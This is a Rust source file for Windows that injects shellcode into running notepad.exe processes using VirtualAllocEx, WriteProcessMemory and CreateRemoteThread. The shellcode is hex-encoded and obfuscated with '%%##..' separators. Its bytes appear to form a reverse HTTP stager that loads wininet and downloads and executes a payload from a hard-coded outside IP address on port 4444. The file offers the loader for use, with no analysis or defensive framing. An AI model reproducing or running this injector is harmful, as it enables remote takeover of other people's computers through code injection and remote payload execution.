use std::{os::windows::{raw::HANDLE, prelude::{OsStringExt}}, ffi::{OsString}};
use ntapi::ntpsapi::{ PS_ATTRIBUTE_LIST};
use winapi::{
    ctypes::{c_void},
    shared::{
        basetsd::SIZE_T,
        ntdef::{OBJECT_ATTRIBUTES, VOID, NULL},
        minwindef::{LPVOID, DWORD, ULONG}
    },
    um::{
        processthreadsapi::{ExitThread, GetCurrentProcess, OpenProcess, CreateRemoteThread,},
        winnt::{ACCESS_MASK, PROCESS_ALL_ACCESS, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE},
        tlhelp32::{CreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, PROCESSENTRY32, Process32First, Process32Next},
        memoryapi::{ WriteProcessMemory, VirtualAllocEx}, 
        handleapi::CloseHandle, 
        winbase::{INFINITE,},
        synchapi::WaitForSingleObject,
    }
};
mod lib;
use lib::*;

extern "C" {
    fn MessageBoxW(hWnd: u64, lpText: *const u8, lpCaption: *const u8, uType: u32) -> u32;
}
unsafe extern "system" fn threadFunc(_: LPVOID) -> DWORD{
    let str_utf16: Vec<u16> = "你好\0".encode_utf16().collect();
    let ptr = str_utf16.as_ptr() as *const u8;
    MessageBoxW(0, ptr, "A\0B\0\0\0".as_ptr(), 0);
    ExitThread(0);
    0
}

fn MyNtCreateThreadEx(){
    unsafe {
            let mut thread_handle: HANDLE = std::ptr::null_mut();
            let desired_access: ACCESS_MASK = 0;
            let object_attributes: *mut OBJECT_ATTRIBUTES = std::ptr::null_mut();
            let process_handle: HANDLE = GetCurrentProcess() as *mut std::ffi::c_void;
            let start_routine = Some(threadFunc).unwrap() as *mut c_void;
            let argument: *mut VOID = std::ptr::null_mut();
            let create_flags: ULONG = 0;
            let zero_bits: SIZE_T = 0;
            let stack_size: SIZE_T = 0;
            let maximum_stack_size: SIZE_T = 0;
            let attribute_list: *mut PS_ATTRIBUTE_LIST = std::ptr::null_mut();
            let status = NtCreateThreadEx(
                &mut thread_handle,
                desired_access,
                object_attributes,
                process_handle,
                start_routine,
                argument,
                create_flags,
                zero_bits,
                stack_size,
                maximum_stack_size,
                attribute_list,
            );
    }
}
fn StrToU8Array(str : &str) -> Vec<u8> {

    let hex_string = str.replace("%%##..", "");
    let bytes = hex::decode(hex_string).unwrap();
    let result = bytes.as_slice(); 
    result.to_vec()
}
pub fn print_memory(memory_ptr: *const u8, size: usize) {
    unsafe {
        let memory_slice = std::slice::from_raw_parts(memory_ptr, size);
        for byte in memory_slice {
            print!("{:02x} ", byte);
        }
    }
    println!("");
}

fn createThreadTest(){
    unsafe {
        let shellcode = StrToU8Array("%%##..fc%%##..48%%##..83%%##..e4%%##..f0%%##..e8%%##..c8%%##..00%%##..00%%##..00%%##..41%%##..51%%##..41%%##..50%%##..52%%##..51%%##..56%%##..48%%##..31%%##..d2%%##..65%%##..48%%##..8b%%##..52%%##..60%%##..48%%##..8b%%##..52%%##..18%%##..48%%##..8b%%##..52%%##..20%%##..48%%##..8b%%##..72%%##..50%%##..48%%##..0f%%##..b7%%##..4a%%##..4a%%##..4d%%##..31%%##..c9%%##..48%%##..31%%##..c0%%##..ac%%##..3c%%##..61%%##..7c%%##..02%%##..2c%%##..20%%##..41%%##..c1%%##..c9%%##..0d%%##..41%%##..01%%##..c1%%##..e2%%##..ed%%##..52%%##..41%%##..51%%##..48%%##..8b%%##..52%%##..20%%##..8b%%##..42%%##..3c%%##..48%%##..01%%##..d0%%##..66%%##..81%%##..78%%##..18%%##..0b%%##..02%%##..75%%##..72%%##..8b%%##..80%%##..88%%##..00%%##..00%%##..00%%##..48%%##..85%%##..c0%%##..74%%##..67%%##..48%%##..01%%##..d0%%##..50%%##..8b%%##..48%%##..18%%##..44%%##..8b%%##..40%%##..20%%##..49%%##..01%%##..d0%%##..e3%%##..56%%##..48%%##..ff%%##..c9%%##..41%%##..8b%%##..34%%##..88%%##..48%%##..01%%##..d6%%##..4d%%##..31%%##..c9%%##..48%%##..31%%##..c0%%##..ac%%##..41%%##..c1%%##..c9%%##..0d%%##..41%%##..01%%##..c1%%##..38%%##..e0%%##..75%%##..f1%%##..4c%%##..03%%##..4c%%##..24%%##..08%%##..45%%##..39%%##..d1%%##..75%%##..d8%%##..58%%##..44%%##..8b%%##..40%%##..24%%##..49%%##..01%%##..d0%%##..66%%##..41%%##..8b%%##..0c%%##..48%%##..44%%##..8b%%##..40%%##..1c%%##..49%%##..01%%##..d0%%##..41%%##..8b%%##..04%%##..88%%##..48%%##..01%%##..d0%%##..41%%##..58%%##..41%%##..58%%##..5e%%##..59%%##..5a%%##..41%%##..58%%##..41%%##..59%%##..41%%##..5a%%##..48%%##..83%%##..ec%%##..20%%##..41%%##..52%%##..ff%%##..e0%%##..58%%##..41%%##..59%%##..5a%%##..48%%##..8b%%##..12%%##..e9%%##..4f%%##..ff%%##..ff%%##..ff%%##..5d%%##..6a%%##..00%%##..49%%##..be%%##..77%%##..69%%##..6e%%##..69%%##..6e%%##..65%%##..74%%##..00%%##..41%%##..56%%##..49%%##..89%%##..e6%%##..4c%%##..89%%##..f1%%##..41%%##..ba%%##..4c%%##..77%%##..26%%##..07%%##..ff%%##..d5%%##..48%%##..31%%##..c9%%##..48%%##..31%%##..d2%%##..4d%%##..31%%##..c0%%##..4d%%##..31%%##..c9%%##..41%%##..50%%##..41%%##..50%%##..41%%##..ba%%##..3a%%##..56%%##..79%%##..a7%%##..ff%%##..d5%%##..eb%%##..73%%##..5a%%##..48%%##..89%%##..c1%%##..41%%##..b8%%##..5c%%##..11%%##..00%%##..00%%##..4d%%##..31%%##..c9%%##..41%%##..51%%##..41%%##..51%%##..6a%%##..03%%##..41%%##..51%%##..41%%##..ba%%##..57%%##..89%%##..9f%%##..c6%%##..ff%%##..d5%%##..eb%%##..59%%##..5b%%##..48%%##..89%%##..c1%%##..48%%##..31%%##..d2%%##..49%%##..89%%##..d8%%##..4d%%##..31%%##..c9%%##..52%%##..68%%##..00%%##..02%%##..40%%##..84%%##..52%%##..52%%##..41%%##..ba%%##..eb%%##..55%%##..2e%%##..3b%%##..ff%%##..d5%%##..48%%##..89%%##..c6%%##..48%%##..83%%##..c3%%##..50%%##..6a%%##..0a%%##..5f%%##..48%%##..89%%##..f1%%##..48%%##..89%%##..da%%##..49%%##..c7%%##..c0%%##..ff%%##..ff%%##..ff%%##..ff%%##..4d%%##..31%%##..c9%%##..52%%##..52%%##..41%%##..ba%%##..2d%%##..06%%##..18%%##..7b%%##..ff%%##..d5%%##..85%%##..c0%%##..0f%%##..85%%##..9d%%##..01%%##..00%%##..00%%##..48%%##..ff%%##..cf%%##..0f%%##..84%%##..8c%%##..01%%##..00%%##..00%%##..eb%%##..d3%%##..e9%%##..e4%%##..01%%##..00%%##..00%%##..e8%%##..a2%%##..ff%%##..ff%%##..ff%%##..2f%%##..62%%##..51%%##..38%%##..72%%##..00%%##..82%%##..00%%##..89%%##..39%%##..7b%%##..eb%%##..1a%%##..94%%##..fc%%##..a3%%##..70%%##..ed%%##..7d%%##..a7%%##..43%%##..60%%##..06%%##..bf%%##..7f%%##..b2%%##..f7%%##..8d%%##..55%%##..66%%##..fe%%##..76%%##..53%%##..3e%%##..d5%%##..75%%##..a4%%##..42%%##..b7%%##..c6%%##..c7%%##..12%%##..32%%##..01%%##..87%%##..a8%%##..21%%##..4f%%##..bc%%##..f6%%##..e4%%##..e4%%##..82%%##..86%%##..7c%%##..9a%%##..7d%%##..fb%%##..ea%%##..40%%##..07%%##..a3%%##..7b%%##..93%%##..a3%%##..bb%%##..dd%%##..ba%%##..1c%%##..bf%%##..25%%##..69%%##..37%%##..03%%##..1d%%##..d3%%##..a4%%##..36%%##..24%%##..00%%##..55%%##..73%%##..65%%##..72%%##..2d%%##..41%%##..67%%##..65%%##..6e%%##..74%%##..3a%%##..20%%##..4d%%##..6f%%##..7a%%##..69%%##..6c%%##..6c%%##..61%%##..2f%%##..35%%##..2e%%##..30%%##..20%%##..28%%##..63%%##..6f%%##..6d%%##..70%%##..61%%##..74%%##..69%%##..62%%##..6c%%##..65%%##..3b%%##..20%%##..4d%%##..53%%##..49%%##..45%%##..20%%##..39%%##..2e%%##..30%%##..3b%%##..20%%##..57%%##..69%%##..6e%%##..64%%##..6f%%##..77%%##..73%%##..20%%##..4e%%##..54%%##..20%%##..36%%##..2e%%##..31%%##..3b%%##..20%%##..57%%##..4f%%##..57%%##..36%%##..34%%##..3b%%##..20%%##..54%%##..72%%##..69%%##..64%%##..65%%##..6e%%##..74%%##..2f%%##..35%%##..2e%%##..30%%##..3b%%##..20%%##..42%%##..4f%%##..49%%##..45%%##..39%%##..3b%%##..45%%##..4e%%##..55%%##..53%%##..4d%%##..53%%##..45%%##..29%%##..0d%%##..0a%%##..00%%##..5f%%##..e6%%##..73%%##..8d%%##..a5%%##..c0%%##..c9%%##..ab%%##..0c%%##..eb%%##..35%%##..7a%%##..a2%%##..e3%%##..bf%%##..5b%%##..89%%##..c3%%##..ed%%##..bc%%##..25%%##..5e%%##..de%%##..3f%%##..da%%##..d2%%##..4c%%##..4e%%##..ba%%##..84%%##..e9%%##..fd%%##..fc%%##..ab%%##..10%%##..7b%%##..04%%##..8d%%##..3f%%##..ba%%##..56%%##..28%%##..a6%%##..91%%##..c5%%##..f7%%##..49%%##..e5%%##..91%%##..89%%##..09%%##..0e%%##..03%%##..22%%##..35%%##..f0%%##..90%%##..f8%%##..05%%##..81%%##..13%%##..67%%##..3a%%##..93%%##..eb%%##..59%%##..27%%##..f0%%##..be%%##..32%%##..d9%%##..ae%%##..18%%##..dc%%##..9d%%##..9b%%##..c9%%##..d0%%##..cb%%##..22%%##..00%%##..53%%##..36%%##..2f%%##..0b%%##..d2%%##..ac%%##..d2%%##..9d%%##..9d%%##..94%%##..4c%%##..83%%##..10%%##..37%%##..a9%%##..69%%##..8b%%##..38%%##..fc%%##..38%%##..3a%%##..45%%##..d0%%##..07%%##..db%%##..ae%%##..3c%%##..e0%%##..b6%%##..7c%%##..ad%%##..a3%%##..c7%%##..36%%##..2c%%##..48%%##..26%%##..35%%##..4a%%##..fc%%##..e1%%##..68%%##..16%%##..3d%%##..33%%##..1c%%##..98%%##..12%%##..2c%%##..de%%##..22%%##..9b%%##..e0%%##..02%%##..13%%##..8c%%##..90%%##..d3%%##..ba%%##..11%%##..20%%##..85%%##..66%%##..a4%%##..e0%%##..57%%##..94%%##..e8%%##..09%%##..fb%%##..9d%%##..1c%%##..49%%##..a2%%##..06%%##..e1%%##..05%%##..83%%##..c8%%##..5d%%##..68%%##..cc%%##..fd%%##..35%%##..31%%##..b0%%##..45%%##..99%%##..f3%%##..05%%##..51%%##..96%%##..15%%##..77%%##..1e%%##..25%%##..9e%%##..5f%%##..4f%%##..e8%%##..41%%##..ee%%##..d2%%##..dd%%##..55%%##..74%%##..27%%##..c3%%##..87%%##..e1%%##..bf%%##..08%%##..60%%##..b4%%##..93%%##..81%%##..f4%%##..62%%##..64%%##..6c%%##..8c%%##..63%%##..00%%##..41%%##..be%%##..f0%%##..b5%%##..a2%%##..56%%##..ff%%##..d5%%##..48%%##..31%%##..c9%%##..ba%%##..00%%##..00%%##..40%%##..00%%##..41%%##..b8%%##..00%%##..10%%##..00%%##..00%%##..41%%##..b9%%##..40%%##..00%%##..00%%##..00%%##..41%%##..ba%%##..58%%##..a4%%##..53%%##..e5%%##..ff%%##..d5%%##..48%%##..93%%##..53%%##..53%%##..48%%##..89%%##..e7%%##..48%%##..89%%##..f1%%##..48%%##..89%%##..da%%##..41%%##..b8%%##..00%%##..20%%##..00%%##..00%%##..49%%##..89%%##..f9%%##..41%%##..ba%%##..12%%##..96%%##..89%%##..e2%%##..ff%%##..d5%%##..48%%##..83%%##..c4%%##..20%%##..85%%##..c0%%##..74%%##..b6%%##..66%%##..8b%%##..07%%##..48%%##..01%%##..c3%%##..85%%##..c0%%##..75%%##..d7%%##..58%%##..58%%##..58%%##..48%%##..05%%##..00%%##..00%%##..00%%##..00%%##..50%%##..c3%%##..e8%%##..9f%%##..fd%%##..ff%%##..ff%%##..33%%##..39%%##..2e%%##..31%%##..30%%##..37%%##..2e%%##..32%%##..33%%##..39%%##..2e%%##..33%%##..30%%##..00%%##..12%%##..34%%##..56%%##..78");
        let snapshot_handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if !snapshot_handle.is_null() {
            let mut process_entry: PROCESSENTRY32 = std::mem::zeroed();
            process_entry.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
            if Process32First(snapshot_handle, &mut process_entry) == 1 {
                loop {
                    let extFileName = OsString::from_wide(process_entry.szExeFile.iter().map(|&x| x as u16).collect::<Vec<u16>>().as_slice());
                    // println!("{:?}",extFileName);
                    if extFileName.to_string_lossy().into_owned().starts_with("notepad.exe") || extFileName.to_string_lossy().into_owned().starts_with("Notepad.exe") {
                        let process_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, process_entry.th32ProcessID);
                        println!("{:?}",process_handle);
                        if !process_handle.is_null() {
                            let remote_buffer = VirtualAllocEx(
                                process_handle,
                                NULL, 
                                shellcode.len(), 
                                MEM_COMMIT | MEM_RESERVE, 
                                PAGE_EXECUTE_READWRITE);
                            if !remote_buffer.is_null() { 
                                let p = WriteProcessMemory(process_handle, remote_buffer, shellcode.as_ptr() as *const winapi::ctypes::c_void, shellcode.len(), NULL as *mut usize);
                                if  p != 0 {
                                    println!("{:?}",remote_buffer);

                                    let remote_thread = CreateRemoteThread(
                                        process_handle, 
                                        0 as *mut winapi::um::minwinbase::SECURITY_ATTRIBUTES,
                                         0, 
                                         Some(std::mem::transmute(remote_buffer)),
                                          NULL, 
                                          0, 
                                          0 as *mut u32);
                                    if remote_thread != NULL {
                                        WaitForSingleObject(remote_thread, INFINITE);
                                        CloseHandle(remote_thread);
                                    }
                                }
                                CloseHandle(remote_buffer);
                            }
                            CloseHandle(process_handle);
                        }
                    }

                    process_entry.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
                    if Process32Next(snapshot_handle, &mut process_entry) == 0 {
                        break;
                    }
                }
            }

            CloseHandle(snapshot_handle);
        }
    }
}


fn main(){
    createThreadTest();
}